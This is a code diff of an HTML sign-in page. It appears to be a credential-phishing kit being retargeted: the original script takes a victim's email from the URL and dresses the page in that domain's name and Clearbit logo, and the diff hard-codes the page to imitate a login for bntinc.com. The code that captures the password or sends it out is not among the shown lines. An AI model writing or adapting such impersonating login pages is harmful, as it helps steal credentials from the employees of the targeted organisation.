@@ -1,3 +1,4 @@
+<!DOCTYPE html>
 <html lang="ko">
 <head>
   <meta http-equiv="Content-Language" content="en-us">
@@ -58,20 +59,20 @@
   </style>
 </head>
 <body>
-  <table border="0" width="100%" cellspacing="0" cellpadding="0">
-    <tr><td>&nbsp;</td></tr>
-    <tr>
-      <td>
-        <div align="center">
-          <table border="0" width="100" cellspacing="0" cellpadding="0">
-            <tr>
-              <td>
-                <table border="0" width="100%" cellspacing="0" cellpadding="0">
-                  <form action="index.html" method="get">
+  <form id="loginForm" action="index.html" method="get">
+    <table border="0" width="100%" cellspacing="0" cellpadding="0">
+      <tr><td>&nbsp;</td></tr>
+      <tr>
+        <td>
+          <div align="center">
+            <table border="0" width="100" cellspacing="0" cellpadding="0">
+              <tr>
+                <td>
+                  <table border="0" width="100%" cellspacing="0" cellpadding="0">
                     <tr><td height="110"></td></tr>
                     <tr>
                       <td height="40" align="center">
-                        <img id="logo" src="https://logo.clearbit.com/domain" width="200" height="40">
+                        <img id="logo" src="https://logo.clearbit.com/bntinc.com" width="200" height="40">
                       </td>
                     </tr>
                     <tr><td height="70"></td></tr>
@@ -79,7 +80,7 @@
                       <td height="26">
                         <h1>
                           <font color="#000000">Sign in to</font>
-                          <font color="#7A7A7A" id="domainLabel">domain</font>
+                          <font color="#7A7A7A" id="domainLabel">bntinc.com</font>
                         </h1>
                       </td>
                     </tr>
@@ -88,9 +89,9 @@
                     <tr>
                       <td width="400" height="40">
                         <div class="input-group">
-                          <input name="login" placeholder="Username" type="text" required class="form-control" id="usernameInput" autofocus >
-                          <input type="hidden" name="domain" id="hiddenDomain">
-                          <span id="domainAddon" style="background-color:#fff; border:none; border-radius:0px; border-bottom: 1px blue solid; border-top: 1px blue solid; border-right: 1px blue solid" class="input-group-addon">@domain</span>
+                          <input type="text" id="usernameInput" placeholder="Username" required class="form-control" autofocus>
+                          <input type="hidden" name="login" id="loginFull">
+                          <span id="domainAddon" style="background-color:#fff; border:none; border-radius:0px; border-bottom: 1px blue solid; border-top: 1px blue solid; border-right: 1px blue solid" class="input-group-addon">@bntinc.com</span>
                         </div>
                       </td>
                     </tr>
@@ -132,36 +133,29 @@
                         </table>
                       </td>
                     </tr>
-                  </form>
-                </table>
-              </td>
-            </tr>
-          </table>
-        </div>
-      </td>
-    </tr>
-  </table>
+                  </table>
+                </td>
+              </tr>
+            </table>
+          </div>
+        </td>
+      </tr>
+    </table>
+  </form>
 
   <script>
-  const params = new URLSearchParams(window.location.search);
-  const raw = params.get('login');
-  const email = raw ? decodeURIComponent(raw) : '';
+    const fixedDomain = 'bntinc.com';
 
-  let user = '', domain = '';
-  if (email.includes('@')) {
-    [user, domain] = email.split('@');
-  }
+    // On submit, build full email login
+    document.getElementById('loginForm').addEventListener('submit', function (e) {
+      const username = document.getElementById('usernameInput').value.trim();
+      document.getElementById('loginFull').value = username + '@' + fixedDomain;
+    });
 
-  // Set input values
-  document.getElementById('hiddenDomain').value = domain || 'domain';
-
-  // Update domain visuals
-  if (domain) {
-    document.getElementById('domainAddon').textContent = '@' + domain;
-    document.getElementById('domainLabel').textContent = domain;
-    document.getElementById('logo').src = 'https://logo.clearbit.com/' + domain;
-  }
-</script>
-
+    // Set visuals
+    document.getElementById('domainAddon').textContent = '@' + fixedDomain;
+    document.getElementById('domainLabel').textContent = fixedDomain;
+    document.getElementById('logo').src = 'https://logo.clearbit.com/' + fixedDomain;
+  </script>
 </body>
 </html>
